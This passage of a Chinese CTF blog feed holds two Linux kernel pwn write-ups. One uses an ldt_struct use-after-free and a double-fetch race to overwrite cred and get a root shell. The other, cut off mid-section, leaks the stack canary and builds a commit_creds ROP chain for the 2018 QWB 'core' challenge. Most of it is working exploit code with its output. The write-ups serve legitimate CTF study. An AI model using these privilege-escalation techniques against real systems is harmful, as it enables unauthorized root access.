<li>控制 cred 结构体</li>
</ul>
<p>虽然获得了页地址，但是在之后搜索 <code>task_struct</code> 的过程中仍可能会陷入到 check_object_size 报错</p>
<p>而在 fork 调用链中，会调用 <code>ldt_dup_context</code>，源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	……</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">	       new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">  </span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到父进程会把调用 memcpy 函数将 ldt-&gt;entries 复制给子进程，这将不会触发 kernel panic，因此如果要获取 task_struct 结构，步骤如下：</p>
<ol>
<li>使用 UAF 修改父进程中的 ldt-&gt;entries, 并将其指向要搜索的地址，即 页偏移</li>
<li>fork 子进程将 ldt-&gt;entries 进行复制</li>
<li>在子进程内对 ldt-&gt;entries 进行搜索，并返回结果</li>
</ol>
<p>每一个进程对应内核中的一个 task_struct 结构，重要源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span>				pid;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * executable name, excluding path.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">    * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">    * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<p>这里的 comm 是指可执行文件的名称，我们进行简单测试<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205121542628.png"></p>
<p>如果能通过搜索进程的 comm 字段，我们也能通过偏移获取 cred 结构以及进程的 pid</p>
<p>通过 <code>prntl()</code> 函数能够使得进程对自己的 comm 名称进行修改</p>
<p>因此获取进程 pid 和 cred 结构体的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;emiyada&quot;</span>);</span><br><span class="line"><span class="type">int</span> pid = getpid();</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">pipe(pipefd);</span><br><span class="line"><span class="type">char</span> *buf = (<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> PAGE_OFFSET=addr;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    addr+=<span class="number">8000</span>;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        ret = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> *search = (<span class="type">unsigned</span> <span class="type">long</span> *) buf;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span> ) search &lt; (<span class="type">unsigned</span> <span class="type">long</span>) buf+<span class="number">0x8000</span>)&#123;</span><br><span class="line">            search = memmem(search, (<span class="type">unsigned</span> <span class="type">long</span>)buf+<span class="number">0x8000</span>- (<span class="type">unsigned</span> <span class="type">long</span>) search, <span class="string">&quot;emiyada&quot;</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (search == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ((search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-3</span>] &gt; PAGE_OFFSET) &amp;&amp; (<span class="type">int</span>) search[<span class="number">-58</span>]==pid)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found cred : %llx\n&quot;</span>, search[<span class="number">-2</span>]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found pid : %d\n&quot;</span>, search[<span class="number">-58</span>]);</span><br><span class="line">                ans = search[<span class="number">-2</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            search+=<span class="number">12</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipefd[<span class="number">1</span>], &amp;ans, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9106c0000000</span><br><span class="line">Found cred : ffff9106c192f6c0</span><br><span class="line">Found pid : 143</span><br></pre></td></tr></table></figure>

<ul>
<li>特权提升 1</li>
</ul>
<p>此时我们可以通过任意写进行特权提升操作，这里可以仍旧使用 <code>ldt_struct</code>，从之前 <code>write_ldt</code> 函数中我们可以看到，进行覆盖 <code>old_ldt</code> 操作时会进行 <code>memcpy</code> 处理，如果结构体足够大，则可以延长 copy 的时间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br></pre></td></tr></table></figure>
<p>所以通过 double fetch 进行提权，步骤如下：</p>
<ol>
<li>将 cred 结构体的地址通过 UAF 写在 ldt-&gt;entries 上</li>
<li>通过 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code> 实现任意写</li>
</ol>
<p>为了提高成功率，将进程绑定在单个 CPU 上，提权代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ret=fork();</span><br><span class="line"><span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">    ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">            alloc_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        set_note(<span class="number">11</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15</span>; i++)&#123;</span><br><span class="line">            free_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">1</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            write_note(cred_addr+<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">    udesc.base_addr=<span class="number">0</span>;</span><br><span class="line">    udesc.entry_number=<span class="number">2</span>;</span><br><span class="line">    udesc.limit=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    udesc.contents=<span class="number">0</span>;</span><br><span class="line">    udesc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    udesc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    udesc.useable=<span class="number">0</span>;</span><br><span class="line">    udesc.lm=<span class="number">0</span>;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;udesc,<span class="keyword">sizeof</span>(udesc));</span><br><span class="line">    sleep(<span class="number">114514</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,geteuid());</span><br><span class="line">setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这种特权提升方式有点问题，之前尝试了十来次才成功 root</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 之 Kernel ROP</title>
    <url>/2022/05/10/CTF-linux-kernel-pwn-0-%E4%B9%8B-Kernel-ROP/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>本文主要学习 Kernel ROP 利用方式<br>题目以 2018 强网杯 core 为例</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>获取题目解压后，查看文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// start.sh</span><br><span class="line">kaslr</span><br><span class="line"></span><br><span class="line">// bzImage </span><br><span class="line">kernel  version  = 4.15.8</span><br><span class="line"></span><br><span class="line">// core.cpio/init</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"></span><br><span class="line">// core.cpio/core.ko</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br></pre></td></tr></table></figure>

<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><strong>init_module</strong><br>在 &#x2F;proc 目录下创建虚拟文件 core 以及虚拟文件对应的操作，0x1B6 即 0666, 表示为普通文件，操作权限 666</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">0x1B6</span>LL, <span class="number">0LL</span>, &amp;core_ops);</span><br><span class="line">	printk(<span class="string">&quot;create /proc/core entry&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exit_module</strong><br>删除虚拟文件 core</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (core_proc)</span><br><span class="line">		result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_release</strong><br>在文件删除时执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_release</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;core: release&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_write</strong><br>从用户空间复制不超过 0x800 字节的数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_write</span><span class="params">(<span class="type">int</span> a1, _user <span class="type">char</span> * buf, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;core: called core_writen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, buf, len))</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    printk(<span class="string">&quot;core: error copying data from userspacen&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>core_read</strong><br>从 v5[off] 拷贝 64 字节数据到用户空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;core: called core_read&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;%d %p&quot;</span>);</span><br><span class="line">    result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_copy_func</strong><br>复制函数，从 name 复制数据到 v2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (a1 &gt; <span class="number">63</span>)</span><br><span class="line">        printk(<span class="string">&quot;Detect Overflow&quot;</span>)</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_ioctl</strong><br>ioctl实现三个功能</p>
<ul>
<li>从内核空间复制信息到用户空间 read</li>
<li>从全局变量 name 复制内容到栈不超过 64 字节</li>
<li>修改全局偏移信息 off<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_ioctl</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> cmd, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> cmd</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">			core_read(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">			printk(<span class="string">&quot;core %d&quot;</span>, );</span><br><span class="line">			off = a3;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">			printk(<span class="string">&quot;core: called core copy&quot;</span>);</span><br><span class="line">			core_copy_func(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>泄漏 Canary</li>
<li>构造ROP链</li>
<li>布置ROP链</li>
</ol>
<p><strong>泄漏 Canary</strong><br>首先通过 core_read 和 off 泄漏 canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] read to buf\n&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *) buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p&quot;</span>, canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line">[*] <span class="built_in">set</span> off to 64</span><br><span class="line">[*] <span class="built_in">read</span> to buf</span><br><span class="line">[*] canary: 0xbb6f283435b8c000</span><br></pre></td></tr></table></figure>

<p><strong>构造初始ROP链</strong><br>ROP链需要通过 gadget 返回执行 <code>commit_cred(prepare_kernel_creds(0))</code></p>
<ul>
<li>如何获取 <code>commit_cred()</code> <code>prepare_kernel_cred()</code> 函数地址<br>本题中将虽然开启了 kptr，但是启动过程中将 <code>/proc/kallsyms</code> 复制到 <code>/tmp/kallsyms</code> 可以直接进行读取</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span> <span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span> <span class="type">size_t</span> <span class="title function_">find_func</span><span class="params">()</span></span><br><span class="line">24 &#123;</span><br><span class="line"><span class="number">25</span>         FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="number">26</span>         <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">27</span>         &#123;</span><br><span class="line"><span class="number">28</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] open kallsyms error!\n&quot;</span>);</span><br><span class="line"><span class="number">29</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">30</span>         &#125;</span><br><span class="line"><span class="number">31</span> </span><br><span class="line"><span class="number">32</span>         <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">33</span>         <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line"><span class="number">34</span>         &#123;</span><br><span class="line"><span class="number">35</span>                 <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line"><span class="number">36</span>                         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">37</span> </span><br><span class="line"><span class="number">38</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line"><span class="number">39</span>                 &#123;</span><br><span class="line"><span class="number">40</span>                         <span class="type">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">41</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">42</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line"><span class="number">43</span>                         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line"><span class="number">44</span>                 &#125;</span><br><span class="line"><span class="number">45</span> </span><br><span class="line"><span class="number">46</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cr    ed)</span><br><span class="line"><span class="number">47</span>                 &#123;</span><br><span class="line"><span class="number">48</span>                         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">49</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">50</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line"><span class="number">51</span>                         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_ker    nel_cred);</span><br><span class="line"><span class="number">52</span>                 &#125;</span><br><span class="line"><span class="number">53</span>         &#125;</span><br><span class="line"><span class="number">54</span> </span><br><span class="line"><span class="number">55</span>         <span class="keyword">if</span> (!(commit_creds &amp; prepare_kernel_cred))</span><br><span class="line"><span class="number">56</span>         &#123;</span><br><span class="line"><span class="number">57</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line"><span class="number">58</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">59</span>         &#125;</span><br><span class="line"><span class="number">60</span> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如何获取 gadget<br>  可以使用 ropper 直接保存所有 gadget<br>  ropper –file .&#x2F;vmlinux –nocolor &gt; g1<br>  ROPgadget –binary .&#x2F;vmlinux &gt; g2</p>
</li>
<li><p>如何获取 gadget 地址<br>  开启 kaslr 后内核加载地址将会变化，但是加载偏移不会变化</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff9129cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffff9129c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br><span class="line"></span><br><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffffa009cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffffa009c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看内核函数的偏移，通过偏移可以计算出 gadget 的位置<br>已知 函数偏移 函数地址<br>    <code>vmlinux base = 函数地址 - 函数偏移</code><br>已知 无偏移 gadget 地址<br><code>真正的 gadget = 原有 gadget - 原有 vmlinux base + 真实 vmlinux base</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec vmlinux</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/embeded/Desktop/core/give_to_player/core/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>执行完 commit_creds(prepare_kernel_cred(0)) 后该怎么办？<br>  返回用户态进行调用</p>
<ul>
<li>为什么要返回用户态<ul>
<li>大部分有用的信息能都在用户态更易获取</li>
<li>内核台不容易办到<ul>
<li>修改文件系统</li>
<li>创建新进程</li>
<li>创建网络连接</li>
</ul>
</li>
</ul>
</li>
<li>如何返回用户态<br>  判断是否属于用户态，一般通过特殊的寄存器指令 <code>swapgs; iretq</code> 需要设置 <code>cs</code> <code>rflags</code> 等信息，函数保存 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">         <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">         <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">         <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">         :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">         :</span><br><span class="line">         : <span class="string">&quot;memory&quot;</span></span><br><span class="line">     );</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>确认 rop 链</p>
